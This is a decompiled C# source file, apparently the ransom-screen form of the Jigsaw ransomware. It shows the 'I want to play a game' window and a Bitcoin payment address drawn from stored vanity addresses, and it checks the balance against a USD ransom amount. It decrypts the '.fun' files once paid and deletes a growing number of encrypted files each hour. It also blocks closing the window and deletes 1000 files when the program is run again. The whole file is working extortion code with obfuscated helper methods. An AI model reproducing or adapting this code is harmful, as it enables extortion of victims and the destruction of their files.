using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using Main.Properties;
using Main.Tools;

namespace Main;

public class FormGame : Form
{
	private static int _timeLeftSec;

	private static int _exponent;

	private const double Base = 1.1;

	private static int _indexNum;

	private IContainer components;

	private Label labelWelcome;

	private Timer timerTypingEffect;

	private Label labelTask;

	private TextBox textBoxAddress;

	private Button buttonCheckPayment;

	private Button buttonViewEncryptedFiles;

	private Timer timerCountDown;

	private Label labelCountDown;

	private Label labelFilesToDelete;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			FormGame.smethod_18(createParams, FormGame.smethod_17(createParams) | 0x200);
			return createParams;
		}
	}

	public FormGame()
	{
		InitializeComponent();
	}

	private void FormGame_Load(object sender, EventArgs e)
	{
		FormGame.smethod_0((Form)(object)this, bool_0: false);
		FormGame.smethod_1((Form)(object)this, bool_0: false);
		FormGame.smethod_2((Form)(object)this, (FormStartPosition)1);
		Windows.MakeTopMost((Form)(object)this);
		FormGame.smethod_3(timerTypingEffect, 125);
		FormGame.smethod_4(timerTypingEffect, bool_0: true);
		FormGame.smethod_5((Control)(object)labelWelcome, "");
		FormGame.smethod_5((Control)(object)labelTask, Config.TaskMessage);
		FormGame.smethod_6((Control)(object)labelTask, bool_0: false);
		FormGame.smethod_7((TextBoxBase)(object)textBoxAddress, bool_0: true);
		FormGame.smethod_5((Control)(object)textBoxAddress, GetBitcoinAddess());
		FormGame.smethod_6((Control)(object)textBoxAddress, bool_0: false);
		FormGame.smethod_6((Control)(object)buttonCheckPayment, bool_0: false);
		FormGame.smethod_6((Control)(object)buttonViewEncryptedFiles, bool_0: false);
		FormGame.smethod_6((Control)(object)labelCountDown, bool_0: false);
		FormGame.smethod_4(timerCountDown, bool_0: false);
		FormGame.smethod_6((Control)(object)labelFilesToDelete, bool_0: false);
		if (DidRun())
		{
			DeleteFiles(1000);
		}
	}

	private static bool DidRun()
	{
		string string_ = FormGame.smethod_8(Config.WorkFolderPath, "dr");
		if (FormGame.smethod_9(string_))
		{
			return true;
		}
		FormGame.smethod_10(string_, "21");
		return false;
	}

	private static void DeleteFiles(int num)
	{
		try
		{
			int num2 = 0;
			foreach (string encryptedFile in Locker.GetEncryptedFiles())
			{
				if (num2 == num)
				{
					break;
				}
				FormGame.smethod_12(FormGame.smethod_11(encryptedFile, ".fun"));
				num2++;
			}
		}
		catch (Exception)
		{
		}
	}

	private static string GetBitcoinAddess()
	{
		string string_ = FormGame.smethod_8(Config.WorkFolderPath, "Address.txt");
		if (FormGame.smethod_9(string_))
		{
			return FormGame.smethod_13(string_);
		}
		HashSet<string> hashSet = new HashSet<string>();
		foreach (string item in FormGame.smethod_15(Resources.vanityAddresses, new string[1] { FormGame.smethod_14() }, StringSplitOptions.RemoveEmptyEntries).ToList())
		{
			hashSet.Add(FormGame.smethod_16(item));
		}
		string text = hashSet.OrderBy((string x) => Guid.NewGuid()).FirstOrDefault();
		FormGame.smethod_10(string_, text);
		return text;
	}

	private void FormGame_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		FormGame.smethod_19((CancelEventArgs)(object)e, bool_0: true);
		FormGame.smethod_20((IWin32Window)(object)this, "You are about to make a very bad decision. Are you sure about it?");
	}

	private void timerTypingEffect_Tick(object sender, EventArgs e)
	{
		string welcomeMessage = Config.WelcomeMessage;
		FormGame.smethod_5((Control)(object)labelWelcome, FormGame.smethod_11(FormGame.smethod_21(welcomeMessage, 0, _indexNum), "_"));
		_indexNum++;
		if (_indexNum == FormGame.smethod_22(welcomeMessage) + 1)
		{
			FormGame.smethod_4(timerTypingEffect, bool_0: false);
			FormGame.smethod_6((Control)(object)labelTask, bool_0: true);
			FormGame.smethod_6((Control)(object)textBoxAddress, bool_0: true);
			FormGame.smethod_6((Control)(object)buttonCheckPayment, bool_0: true);
			FormGame.smethod_6((Control)(object)buttonViewEncryptedFiles, bool_0: true);
			FormGame.smethod_6((Control)(object)labelCountDown, bool_0: true);
			FormGame.smethod_4(timerCountDown, bool_0: true);
			FormGame.smethod_6((Control)(object)labelFilesToDelete, bool_0: true);
			_timeLeftSec = 3600;
		}
	}

	private void buttonCheckPayment_Click(object sender, EventArgs e)
	{
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			double price = Blockr.GetPrice();
			int num = (int)(Blockr.GetBalanceBtc(GetBitcoinAddess()) * price);
			if (num > Config.RansomUsd)
			{
				FormGame.smethod_23(timerCountDown);
				FormGame.smethod_24((Control)(object)buttonCheckPayment, bool_0: false);
				FormGame.smethod_25((Control)(object)buttonCheckPayment, Color.Lime);
				FormGame.smethod_5((Control)(object)buttonCheckPayment, "Great job, I'm decrypting your files...");
				FormGame.smethod_26((IWin32Window)(object)this, "Decrypting your files. It will take for a while. After done I will close and completely remove myself from your computer.", "Great job");
				Locker.DecryptFiles(".fun");
				Hacking.RemoveItself();
			}
			else if (num > 0)
			{
				FormGame.smethod_25((Control)(object)buttonCheckPayment, Color.Tomato);
				FormGame.smethod_5((Control)(object)buttonCheckPayment, "You did not sent me enough! Try again!");
			}
			else
			{
				FormGame.smethod_25((Control)(object)buttonCheckPayment, Color.Tomato);
				FormGame.smethod_5((Control)(object)buttonCheckPayment, "You haven't made payment yet! Try again!");
			}
		}
		catch (Exception object_)
		{
			FormGame.smethod_28(FormGame.smethod_27((object)object_));
			FormGame.smethod_5((Control)(object)buttonCheckPayment, "Are you connected to the internet? Try again!");
			FormGame.smethod_25((Control)(object)buttonCheckPayment, Color.Tomato);
		}
	}

	private void buttonViewEncryptedFiles_Click(object sender, EventArgs e)
	{
		FormGame.smethod_29((Form)(object)new FormEncryptedFiles(), (IWin32Window)(object)this);
	}

	private void timerCountDown_Tick(object sender, EventArgs e)
	{
		if (_timeLeftSec > 0)
		{
			_timeLeftSec--;
			int num = _timeLeftSec / 60;
			int num2 = _timeLeftSec % 60;
			FormGame.smethod_5((Control)(object)labelCountDown, FormGame.smethod_30((object)num, (object)":", (object)num2));
		}
		else
		{
			_timeLeftSec = 3600;
			int num3 = (int)FormGame.smethod_31(1.1, (double)_exponent);
			FormGame.smethod_5((Control)(object)labelFilesToDelete, FormGame.smethod_32((object)num3, (object)" files will be deleted"));
			_exponent++;
			DeleteFiles(num3);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			FormGame.smethod_33((IDisposable)components);
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_03b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ba: Expected O, but got Unknown
		//IL_0451: Unknown result type (might be due to invalid IL or missing references)
		//IL_045b: Expected O, but got Unknown
		//IL_058b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0595: Expected O, but got Unknown
		components = FormGame.smethod_34();
		labelWelcome = FormGame.smethod_35();
		timerTypingEffect = FormGame.smethod_36(components);
		labelTask = FormGame.smethod_35();
		textBoxAddress = FormGame.smethod_37();
		buttonCheckPayment = FormGame.smethod_38();
		buttonViewEncryptedFiles = FormGame.smethod_38();
		timerCountDown = FormGame.smethod_36(components);
		labelCountDown = FormGame.smethod_35();
		labelFilesToDelete = FormGame.smethod_35();
		FormGame.smethod_39((Control)(object)this);
		FormGame.smethod_40((Control)(object)labelWelcome, bool_0: true);
		FormGame.smethod_25((Control)(object)labelWelcome, Color.Black);
		FormGame.smethod_42((Control)(object)labelWelcome, FormGame.smethod_41("Lucida Console", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		FormGame.smethod_43((Control)(object)labelWelcome, Color.Lime);
		((Control)labelWelcome).set_Location(new Point(25, 29));
		((Control)labelWelcome).set_Name("labelWelcome");
		((Control)labelWelcome).set_Size(new Size(218, 16));
		((Control)labelWelcome).set_TabIndex(0);
		((Control)labelWelcome).set_Text("I want to play a game");
		timerTypingEffect.add_Tick((EventHandler)timerTypingEffect_Tick);
		((Control)labelTask).set_AutoSize(true);
		((Control)labelTask).set_BackColor(Color.Black);
		((Control)labelTask).set_Font(new Font("Lucida Console", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)labelTask).set_ForeColor(Color.Lime);
		((Control)labelTask).set_Location(new Point(25, 505));
		((Control)labelTask).set_Name("labelTask");
		((Control)labelTask).set_Size(new Size(239, 16));
		((Control)labelTask).set_TabIndex(1);
		((Control)labelTask).set_Text("All you have to do...");
		((Control)textBoxAddress).set_Location(new Point(28, 524));
		((Control)textBoxAddress).set_Name("textBoxAddress");
		((Control)textBoxAddress).set_Size(new Size(348, 20));
		((Control)textBoxAddress).set_TabIndex(2);
		((Control)textBoxAddress).set_Text("12Xspzstah37626slkwKhsKSHA");
		((Control)buttonCheckPayment).set_BackColor(Color.Gold);
		((Control)buttonCheckPayment).set_Location(new Point(28, 551));
		((Control)buttonCheckPayment).set_Name("buttonCheckPayment");
		((Control)buttonCheckPayment).set_Size(new Size(348, 33));
		((Control)buttonCheckPayment).set_TabIndex(3);
		((Control)buttonCheckPayment).set_Text("I made a payment, now give me back my files!");
		((ButtonBase)buttonCheckPayment).set_UseVisualStyleBackColor(false);
		((Control)buttonCheckPayment).add_Click((EventHandler)buttonCheckPayment_Click);
		((Control)buttonViewEncryptedFiles).set_BackColor(Color.Gray);
		((Control)buttonViewEncryptedFiles).set_Location(new Point(28, 479));
		((Control)buttonViewEncryptedFiles).set_Name("buttonViewEncryptedFiles");
		((Control)buttonViewEncryptedFiles).set_Size(new Size(348, 23));
		((Control)buttonViewEncryptedFiles).set_TabIndex(4);
		((Control)buttonViewEncryptedFiles).set_Text("View encrypted files");
		((ButtonBase)buttonViewEncryptedFiles).set_UseVisualStyleBackColor(false);
		((Control)buttonViewEncryptedFiles).add_Click((EventHandler)buttonViewEncryptedFiles_Click);
		timerCountDown.set_Interval(1000);
		timerCountDown.add_Tick((EventHandler)timerCountDown_Tick);
		((Control)labelCountDown).set_AutoSize(true);
		((Control)labelCountDown).set_BackColor(Color.Black);
		labelCountDown.set_BorderStyle((BorderStyle)2);
		((Control)labelCountDown).set_Font(new Font("Lucida Sans Unicode", 48f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)labelCountDown).set_ForeColor(Color.DarkRed);
		((Control)labelCountDown).set_Location(new Point(28, 320));
		((Control)labelCountDown).set_Name("labelCountDown");
		((Control)labelCountDown).set_Size(new Size(220, 80));
		((Control)labelCountDown).set_TabIndex(5);
		((Control)labelCountDown).set_Text("59:59");
		((Control)labelFilesToDelete).set_AutoSize(true);
		((Control)labelFilesToDelete).set_BackColor(Color.Black);
		((Control)labelFilesToDelete).set_Font(new Font("Lucida Console", 12f, (FontStyle)1));
		((Control)labelFilesToDelete).set_ForeColor(Color.Lime);
		((Control)labelFilesToDelete).set_Location(new Point(24, 455));
		((Control)labelFilesToDelete).set_Name("labelFilesToDelete");
		((Control)labelFilesToDelete).set_Size(new Size(261, 16));
		((Control)labelFilesToDelete).set_TabIndex(6);
		((Control)labelFilesToDelete).set_Text("1 file will be deleted.");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)(object)Resources.Jigsaw);
		((Form)this).set_ClientSize(new Size(840, 596));
		((Control)this).get_Controls().Add((Control)(object)labelFilesToDelete);
		((Control)this).get_Controls().Add((Control)(object)labelCountDown);
		((Control)this).get_Controls().Add((Control)(object)buttonViewEncryptedFiles);
		((Control)this).get_Controls().Add((Control)(object)buttonCheckPayment);
		((Control)this).get_Controls().Add((Control)(object)textBoxAddress);
		((Control)this).get_Controls().Add((Control)(object)labelTask);
		((Control)this).get_Controls().Add((Control)(object)labelWelcome);
		((Control)this).set_Name("FormGame");
		((Form)this).add_FormClosing(new FormClosingEventHandler(FormGame_FormClosing));
		((Form)this).add_Load((EventHandler)FormGame_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	static void smethod_0(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_1(Form form_0, bool bool_0)
	{
		form_0.set_MinimizeBox(bool_0);
	}

	static void smethod_2(Form form_0, FormStartPosition formStartPosition_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_StartPosition(formStartPosition_0);
	}

	static void smethod_3(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_4(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_5(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static void smethod_6(Control control_0, bool bool_0)
	{
		control_0.set_Visible(bool_0);
	}

	static void smethod_7(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static string smethod_8(string string_0, string string_1)
	{
		return Path.Combine(string_0, string_1);
	}

	static bool smethod_9(string string_0)
	{
		return File.Exists(string_0);
	}

	static void smethod_10(string string_0, string string_1)
	{
		File.WriteAllText(string_0, string_1);
	}

	static string smethod_11(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_12(string string_0)
	{
		File.Delete(string_0);
	}

	static string smethod_13(string string_0)
	{
		return File.ReadAllText(string_0);
	}

	static string smethod_14()
	{
		return Environment.NewLine;
	}

	static string[] smethod_15(string string_0, string[] string_1, StringSplitOptions stringSplitOptions_0)
	{
		return string_0.Split(string_1, stringSplitOptions_0);
	}

	static string smethod_16(string string_0)
	{
		return string_0.Trim();
	}

	static int smethod_17(CreateParams createParams_0)
	{
		return createParams_0.get_ClassStyle();
	}

	static void smethod_18(CreateParams createParams_0, int int_0)
	{
		createParams_0.set_ClassStyle(int_0);
	}

	static void smethod_19(CancelEventArgs cancelEventArgs_0, bool bool_0)
	{
		cancelEventArgs_0.Cancel = bool_0;
	}

	static DialogResult smethod_20(IWin32Window iwin32Window_0, string string_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		return MessageBox.Show(iwin32Window_0, string_0);
	}

	static string smethod_21(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static int smethod_22(string string_0)
	{
		return string_0.Length;
	}

	static void smethod_23(Timer timer_0)
	{
		timer_0.Stop();
	}

	static void smethod_24(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static void smethod_25(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static DialogResult smethod_26(IWin32Window iwin32Window_0, string string_0, string string_1)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		return MessageBox.Show(iwin32Window_0, string_0, string_1);
	}

	static string smethod_27(object object_0)
	{
		return object_0.ToString();
	}

	static DialogResult smethod_28(string string_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		return MessageBox.Show(string_0);
	}

	static void smethod_29(Form form_0, IWin32Window iwin32Window_0)
	{
		form_0.Show(iwin32Window_0);
	}

	static string smethod_30(object object_0, object object_1, object object_2)
	{
		return string.Concat(object_0, object_1, object_2);
	}

	static double smethod_31(double double_0, double double_1)
	{
		return Math.Pow(double_0, double_1);
	}

	static string smethod_32(object object_0, object object_1)
	{
		return string.Concat(object_0, object_1);
	}

	static void smethod_33(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_34()
	{
		return new Container();
	}

	static Label smethod_35()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static Timer smethod_36(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static TextBox smethod_37()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new TextBox();
	}

	static Button smethod_38()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static void smethod_39(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_40(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static Font smethod_41(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_42(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_43(Control control_0, Color color_0)
	{
		control_0.set_ForeColor(color_0);
	}
}
